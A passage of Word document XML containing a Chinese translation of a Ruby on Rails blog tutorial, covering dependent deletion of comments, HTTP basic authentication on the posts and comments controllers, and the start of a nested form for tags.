          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@post.comments</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 集合，然后从数据库 remove 它，最后传回消息到 post 的 show action。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E0A612" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="3"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>12.1 Deleting Associated Objects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="494FDB0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如果你删除一个了 post，那么与之相关联的 comments 也需要被删除。否则他们将会只是在数据库中占用空间（别无它用）。Rails 允许你通过关系的依赖选项完成（上述功能）。修改Post model，</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/models/post.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，像这样：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="4A2DED2F" w14:textId="77777777" w:rsidTr="005767EE">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="17936BC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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D99590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validates :name,  :presence</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EFA1952" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005767EE">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>  validates :title, :presence</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true,  :length</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :minimum</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 5</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6BAA313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w:t>
            </w:r>
            <w:r w:rsidRPr="00253192">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>has_many :comments</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidRPr="00253192">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:dependent</w:t>
            </w:r>
            <w:r w:rsidRPr="00253192">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00253192">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; :destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B2EB6F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5EF0FA9D"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13 Security</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DCB515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如果你就这样 publish 你的 blog 在互联网，任何人都可以添加，编辑和删除 post 或者删除 comments。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BFD7869"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Rails 提供了一个非常简单的 HTTP 认证系统在这样的情况下会非常适合。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26013840"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在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PostsController</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中我们需要一个方法来阻止没有通过认证的用户的操作，这里我们可以使用Rails的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>http_basic_authenticate_with</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这个方法，运行访问请求如果这个方法是允许的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D7BC81"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要使用这个认证系统，我们需要在PostsController 的顶部在指定（即引用）它，这样我们希望用户在进行每个action的时候都是通过授权的，除了index和show，因此我们这样写：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="039CCB74" w14:textId="77777777" w:rsidTr="007D08BD">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4A675EC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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>PostsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AAAED4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0A5E7EF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w:t>
            </w:r>
            <w:r w:rsidRPr="00253192">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>http_basic_authenticate_with</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00253192">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:name</w:t>
            </w:r>
            <w:r w:rsidRPr="00253192">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00253192">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; "dhh"</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidRPr="00253192">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:password</w:t>
            </w:r>
            <w:r w:rsidRPr="00253192">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00253192">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; "secret"</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidRPr="00253192">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:except</w:t>
            </w:r>
            <w:r w:rsidRPr="00253192">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00253192">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; [:index, :show]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="663A657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69541B0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 GET /posts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A9D418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 GET /posts.json</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DE84A3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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>index</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3373D5D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@posts</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Post.all</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7DDFFD0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respond_to do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14FB313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snipped for brevity</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3135CFE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我们同样希望只有授权用户能够删除评论，因此在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>CommentsController</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样写：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="6B28C457" w14:textId="77777777" w:rsidTr="007D08BD">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78756B3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class</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>CommentsController &lt; ApplicationController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B9F13D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30C8161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http_basic_authenticate_with :name</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "dhh", :password</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">=&gt; "secret", </w:t>
            </w:r>
            <w:r w:rsidRPr="005B71EB">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:only</w:t>
            </w:r>
            <w:r w:rsidRPr="005B71EB">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005B71EB">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; :destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0703353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211C2FF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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5168825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@post</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Post.find(params[:post_id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="315D80F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snipped for brevity</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1601242F"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现在如果你尝试创建一个新的 post，你将会迎来一个基于 HTTP 认证的挑战。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D5EC2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0978752F" wp14:editId="6D3454D4">
            <wp:extent cx="5162550" cy="4429125"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="4" name="图片 4" descr="Basic HTTP Authentication Challe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sic HTTP Authentication Challenge"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId93" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5162550" cy="4429125"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD250AA"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 xml:space="preserve">14 Building a </w:t>
      </w:r>
      <w:r w:rsidRPr="005B71EB">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>Multi-Model Form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686D6D2F"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另一个功能来平衡你的 blog 是能够给 posts 添加 tag。要想在你的程序中实现这个功能需要在一个 form 中与超过一个 model 互动。Rails 提供了</w:t>
      </w:r>
      <w:r w:rsidRPr="005B71EB">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>嵌套 forms</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4902A5B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为了演示这个（功能），你将会在你创建 post 的 form 中添加 post 的多 tag支持。首先创建一个 new model来存放 tags：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6696"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="3F62CF8B" w14:textId="77777777" w:rsidTr="007D08BD">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="059BA70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rails generate model Tag name:string post:references</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4CC0DCD7"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再次运行 migration 来创建数据库表单：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2256"/>
      </w:tblGrid>
